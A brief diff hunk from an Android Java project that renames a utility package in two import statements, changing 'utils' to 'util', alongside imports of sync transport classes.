@@ -14,8 +14,8 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.action.sync.GprsTransport;
 import com.ht.RCSAndroidGUI.action.sync.WifiTransport;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
-import com.ht.RCSAndroidGUI.utils.WChar;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
